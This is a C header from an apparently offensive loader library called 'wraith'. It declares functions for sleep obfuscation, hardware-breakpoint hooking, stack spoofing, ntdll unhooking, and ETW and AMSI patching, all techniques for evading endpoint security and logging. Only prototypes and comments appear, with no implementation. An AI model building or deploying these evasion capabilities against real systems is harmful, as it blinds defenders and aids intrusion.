/*
 * include/wraith/wraith_stealth.h
 *
 * Opt-in stealth-control surface. Each entry point is conditionally
 * compiled based on the corresponding WRAITH_USE_* macro - if a feature was
 * compiled out, calling the corresponding API returns
 * WRAITH_E_FEATURE_DISABLED.
 *
 * The intent is that consumers with `paranoid-full` builds can drive the
 * stealth state machine explicitly; the default profile keeps these
 * symbols out of the binary entirely.
 */

#ifndef WRAITH_STEALTH_H
#define WRAITH_STEALTH_H

#include "wraith_status.h"
#include "wraith_types.h"

#ifdef __cplusplus
extern "C" {
#endif

/* -------------------------------------------------------------------------
 * Sleep obfuscation - request that the loaded image be encrypted in place
 * and the calling thread blocked for `duration_ms`. When WRAITH_F_THREADLESS_EXEC
 * is also set, the awakener runs from a hijacked thread-pool callback.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_sleep(wraith_handle_t h, uint32_t duration_ms);

/* -------------------------------------------------------------------------
 * Trigger a one-shot "encrypt now / decrypt on demand" cycle for the
 * Page-Guard tier . Useful when the consumer wants to mark idle
 * windows shorter than a regular sleep would justify.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_pageguard_arm(wraith_handle_t h);
wraith_status_t wraith_pageguard_disarm(wraith_handle_t h);

/* -------------------------------------------------------------------------
 * Hardware-breakpoint hooks . Install/remove a DR-based redirect from
 * `target_fn` to `replacement_fn` for the calling thread only.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_hwbp_install(void *target_fn, void *replacement_fn,
  int dr_index /* 0..3, -1 = auto */);
wraith_status_t wraith_hwbp_remove(int dr_index);

/* -------------------------------------------------------------------------
 * Stack spoofing - returns WRAITH_OK if the synthetic-frame engine
 * has a curated gadget table for the current OS build, otherwise
 * WRAITH_E_STEALTH_INCOMPATIBLE (caller should disable WRAITH_F_STACK_SPOOF).
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_stackspoof_probe(void);

/* -------------------------------------------------------------------------
 * Userland unhooking - either via legacy disk-refresh (WRAITH_USE_UNHOOK_NTDLL)
 * or via Private ntdll (WRAITH_USE_PRIVATE_NTDLL). The flag set on
 * wraith_load_options picks which mechanism is used.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_unhook_ntdll(void);

/* -------------------------------------------------------------------------
 * ETW / AMSI patches. Idempotent. Not undone by wraith_free_library - they
 * affect the host process for its remaining lifetime.
 * ------------------------------------------------------------------------- */
wraith_status_t wraith_patch_etw(void);
wraith_status_t wraith_patch_amsi(void);

#ifdef __cplusplus
}
#endif

#endif  /* WRAITH_STEALTH_H */
